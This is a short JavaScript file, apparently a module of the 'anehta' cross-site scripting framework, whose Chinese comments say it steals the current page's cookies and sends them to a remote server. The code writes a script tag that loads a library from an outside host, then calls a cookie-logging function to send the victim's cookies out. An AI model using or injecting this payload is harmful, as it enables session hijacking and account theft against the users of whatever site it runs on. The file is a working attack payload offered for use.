/////////////////////////////////////////////////
// clx.js 楚留香模块，盗取当前页面cookie
// 并发送到远程server
//alert("clx.js 楚留香模块");
/////////////////////////////////////////////////

////////////////////////////////////////////////////////////
// 开始执行功能
// Author: axis
////////////////////////////////////////////////////////////
// 有时后需要在远程单独加载此模块,所以需要单独定义好
/*检测是否加载了js文件*/
var anehtaurl = "http://www.secwiki.com/anehta";
var BaseLib = anehtaurl+"/library/base.js";


if (typeof isBaseLibLoaded == "undefined" ){
	//alert("base not load");
	document.write("<script src="+BaseLib+"></script>");
} 

setTimeout(function(){ anehta.logger.logCookie(); } ,50);


